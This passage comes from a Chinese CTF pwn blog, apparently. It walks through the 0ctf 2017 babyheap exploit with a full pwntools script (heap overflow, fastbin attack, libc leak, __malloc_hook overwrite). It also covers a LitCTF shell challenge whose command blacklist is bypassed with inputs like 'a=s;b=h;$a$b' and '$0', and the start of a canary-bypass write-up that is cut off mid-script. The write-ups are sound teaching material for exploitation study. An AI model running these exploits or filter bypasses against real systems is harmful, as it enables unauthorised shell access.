&quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      result = sub_138C();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> sub_11B2(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次要求输入size，不限制输入大小，可以堆溢出<br>Free函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_F50</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(<span class="type">unsigned</span> <span class="type">int</span> *)(<span class="number">24LL</span> * (<span class="type">int</span>)result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_DWORD *)(<span class="number">24LL</span> * v2 + a1) = <span class="number">0</span>;</span><br><span class="line">      *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>));</span><br><span class="line">      result = <span class="number">24LL</span> * v2 + a1;</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>释放后指针置0，不能uaf，但可以双重释放进行fastbin attack<br>fee后对应的记录该chunk是否被使用的值会被重新设置为0<br>Dump函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_1051</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  result = sub_138C();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)result &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = *(_DWORD *)(<span class="number">24LL</span> * result + a1);</span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">      sub_130F(*(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">16</span>), *(_QWORD *)(<span class="number">24LL</span> * v2 + a1 + <span class="number">8</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(byte_14F1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印堆块内容，可以用于泄露fd指针<br></p><p>先放wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/turing/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">io=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28809</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Command: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1 back</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2 (point to 4)</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#防止4被top chunk合并</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">leak_hook=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">88</span>-<span class="number">0x10</span></span><br><span class="line">libcbase=leak_hook-<span class="number">0x3c4b78</span>+<span class="number">88</span>+<span class="number">0x10</span>  <span class="comment">#-libc.sym[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line">one_gadget_offset=<span class="number">0x4526a</span></span><br><span class="line">getshell=libcbase+one_gadget_offset</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload=p64(leak_hook-<span class="number">35</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#5</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#6 (leak_hook-35)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">35</span>-<span class="number">0x10</span>)+p64(getshell)</span><br><span class="line">fill(<span class="number">6</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>因为用笔者本地的libc-2.23.so调试出来的部分偏移与远程有一点偏差，所以有些地方的偏移直接用了其他师傅的<br>checksec看一眼<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">turing@LAPTOP-6JKPOVPE:~$ checksec babyheap_0ctf_2017</span><br><span class="line">[*] &#x27;/home/turing/babyheap_0ctf_2017&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br></pre></td></tr></table></figure><p>很好，64位保护全开<br>我们照着wp一步步走，先申请0123四个大小0x10（实际为0x20）的堆块，然后再申请大小0x80（实际为0x90）的堆块。<br><strong>关于chunk大小：前0x8字节为pre_size，接下0x8字节为size域，存储chunk大小。而其实size域的低3bit是标志位，size域存储的原始数值并不是chunk的真正大小，而应该把size域低3bit清零才是</strong>。所以堆块0123的size域其实是0x21，低3bit清零后为0x20，chunk实际大小为0x20。其他chunk也同理。<br>回到题目，先把1和2代表的chunk给free，送入了fastbin（此题glibc版本还未引入tcachebin），接下里chunk0便是修改chunk2的源头，利用选项2，Edit函数的堆溢出漏洞，将chunk2的fd指针修改，只修改了最低一字节为0x80，因为这几个chunk的地址前几个字节部分都是一致的（调试一下就知道了），这样修改后fastbin中的chunk2的fd便指向了chunk4，然后再利用chunk3的溢出来修改chunk4的size域为0x21，以伪造出chunk4在fastbin中的假象。接下来重新将chunk1和chunk2申请回来，注意此时在fastbin链表中chunk2为第一个chunk，而chunk4被伪装成了下一个chunk，所以申请时index&#x3D;1得到的chunk为原来的chunk2，而index&#x3D;2申请到的堆块其实时chunk4<br>此时我们发现index&#x3D;2和index&#x3D;4都指向了同一个chunk4。这样chunk4在被释放后仍然可以通过index&#x3D;2访问到。接下来我们要把chunk4放入unsortedbin（<strong>程序free时，如果chunk不满足fastbin要求，则会放入unsorted Bin ,其在使用的过程中，采用的遍历顺序是 FIFO，即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取，在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中</strong>），于是乎我们再次利用chunk3溢出来修改chunk4的size域变回0x91，然后free掉chunk4<br><strong>这里要注意，程序free一个chunk时会检查其下一个chunk，如果这个释放的chunk与top chunk相邻，则会被top chunk合并</strong>。<br>所以我们释放chunk4前先随便申请一个不会影响我们的chunk5，防止chunk4被free时合并进top chunk<br>这样chunk4进入了unsorted bin，unsorted bin是一个循环双链表<br><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/unsortedbins-struct.jpg"></p><p>正因为其是一个双向循环链表，可以看到unsorted bin中最早被释放chunk的fd指针会指向main_arena的某一块（与main_arena起始地址存在偏移），如果我们可以把正确的 fd 指针 leak 出来，就可以获得一个与 main_arena 有固定偏移的地址，这个偏移可以通过调试得出。而main_arena 是一个 struct malloc_state 类型的全局变量，是 ptmalloc 管理主分配区的唯一实例。说到全局变量，立马可以想到他会被分配在 .data 或者 .bss 等段上，我们就可以获得 main_arena 与 libc 基地址的偏移，泄露libc<br>主要有两个泄露main_arena地址的方法。一是malloc_trim这个函数直接访问了main_arena地址，我们用ida分析一下对应的.so文件直接就能得到main_arena地址<br>二是利用malloc_hook函数，这个函数和main_arena 的地址差是 0x10，而大多数的 libc 都可以直接查出 __malloc_hook 的地址，这样可以大幅减小工作量。以 pwntools 为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main_arena_offset = ELF(<span class="string">&quot;libc.so.6&quot;</span>).symbols[<span class="string">&quot;__malloc_hook&quot;</span>] + <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>这个0x10的偏移不会变。回到题目，我们利用index&#x3D;2访问在unsorted bin中的chunk4，打印出其数据，成功泄露其fd指针，再调试程序得到泄露地址与main_arena的偏移88，于是malloc_hook的地址我们便得到了。此时libcbase便可以计算出了。<br><strong>malloc_hook函数是一个危险的函数，在程序调用malloc，realloc和free函数时都会先执行malloc_hook函数</strong>，于是我们再利用fastbin attack，修改malloc_hook函数地址为我们利用one_gadget工具找到的可以直接getshell的地址，便大功告成了<br>因为我们此时index&#x3D;2也指向chunk4，实际上实现了uaf漏洞，于是我们要把chunk4放入fastbin，但chunk4太大了，且此时仍在unsortedbin中，于是我们再申请一个0x60的chunk，实际上这时候fastbin中没有chunk，返回的便是unsorted bin中别分割的chunk4，且index&#x3D;4，chunk4剩余的0x20仍在unsorted bin中<br>然后我们再free掉chunk4，chunk4便如愿以偿的进入了fastbin，接下来利用uaf进行fastbin attack,最后再申请一个chunk以执行malloc_hook便成功getshell<br></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> uaf </category>
          
          <category> heap overflow </category>
          
          <category> fastbin attack </category>
          
          <category> unsortedbin attack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF2025_nc</title>
      <link href="/2025/06/30/LitCTF2025_nc/"/>
      <url>/2025/06/30/LitCTF2025_nc/</url>
      
        <content type="html"><![CDATA[<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><h3 id="复盘-命令过滤-getshell指令"><a href="#复盘-命令过滤-getshell指令" class="headerlink" title="复盘&#x2F;命令过滤&#x2F;getshell指令"></a>复盘&#x2F;命令过滤&#x2F;getshell指令</h3><p>把附件拖进ida发现得出了我看不懂的一坨玩意<br>在re手的指导下，直接用vscode打开得到了一段python代码，如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;input your command&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br></pre></td></tr></table></figure><p>直接给到了system执行，但是过滤了一系列命令<br></p><p>我第一思路是变量替换,输入如下<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=s;b=h;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure><p>后来又发现直接输入$0也可getshell</p><h3 id="复现平台关了，剩下题目以后再说"><a href="#复现平台关了，剩下题目以后再说" class="headerlink" title="复现平台关了，剩下题目以后再说"></a>复现平台关了，剩下题目以后再说</h3>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> bin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复盘 </tag>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>御网杯2025</title>
      <link href="/2025/05/17/%E5%BE%A1%E7%BD%91%E6%9D%AF2025/"/>
      <url>/2025/05/17/%E5%BE%A1%E7%BD%91%E6%9D%AF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="Canary"><a href="#Canary" class="headerlink" title="Canary"></a>Canary</h2><h3 id="复盘-ret2text-canary-伪随机数"><a href="#复盘-ret2text-canary-伪随机数" class="headerlink" title="复盘&#x2F;ret2text&#x2F;canary&#x2F;伪随机数"></a>复盘&#x2F;ret2text&#x2F;canary&#x2F;伪随机数</h3><p>题目源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  sub_401296();</span><br><span class="line">  sub_4013C7();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>两个函数分别如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_401296</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open /dev/urandom&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  read(fd, &amp;qword_4040D0, <span class="number">8uLL</span>);</span><br><span class="line">  close(fd);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand((v0 ^ qword_4040D0) &amp; <span class="number">0xFFFFFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">__int64 <span class="title function_">sub_4013C7</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">88</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+58h] [rbp-18h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  qword_4040D0 = (__int64)rand() &lt;&lt; <span class="number">32</span>;</span><br><span class="line">  qword_4040D0 += rand();</span><br><span class="line">  v2 = qword_4040D0;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I have a secret. Can you find it?&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( !v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40135C();</span><br><span class="line">    v3 = sub_401397();</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> ( qword_404088 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;My secret is %016lx\n&quot;</span>, qword_4040D0);</span><br><span class="line">          qword_4040D0 = (__int64)rand() &lt;&lt; <span class="number">32</span>;</span><br><span class="line">          qword_4040D0 += rand();</span><br><span class="line">          v2 = qword_4040D0;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;But now, I have a new Secret.&quot;</span>);</span><br><span class="line">          --qword_404088;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Just one time!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Show me the code:&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0x100u</span>LL);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = qword_4040D0;</span><br><span class="line">  <span class="keyword">if</span> ( v2 != qword_4040D0 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey, What are you doing?&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>checksec发现并没有开启canary保护，看源码原来是自定义的随机字符串放在栈溢出的边缘模拟了canary机制，在sub_4013C7()函数返回前检查这个随机的字符串是否被修改。自然而然想到了泄露随机seed或是canary或者爆破canary。但是此题的seed无法直接泄露，但是可以爆破，笔者这里采取了不那么麻烦的做法。<br>canary在选项2直接给出，给出后马上实时更新了canary。既然实时更新，说明在更新前我们对canary的覆盖并不会造成影响，只需要溢出完成后更新一次就好了。即通过选项1来写ret2text，然后选项2更新canary，再通过选项3退出循环触发返回到system(“&#x2F;bin&#x2F;sh”);。需要注意的是，控制循环的变量也储存在栈上，需要注意覆盖为0确保写完ret2text后循环继续以便于更新canary。<br>至于爆破canary，我们先通过选项2泄露出canary，然后canary更新，这时我们有上一个canary，也就是这个随机序列的前两个随机数（题目用两个32位随机数移位合成一个64位canary）。那么我们便可以不断地从0到0xffffff尝试seed，然后用两个随机数合成一个64位值，若这个值和此前泄露的canary相等，说明我们找到了seed，这时更新的canary我们也就知道了。<br>wp如下<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span 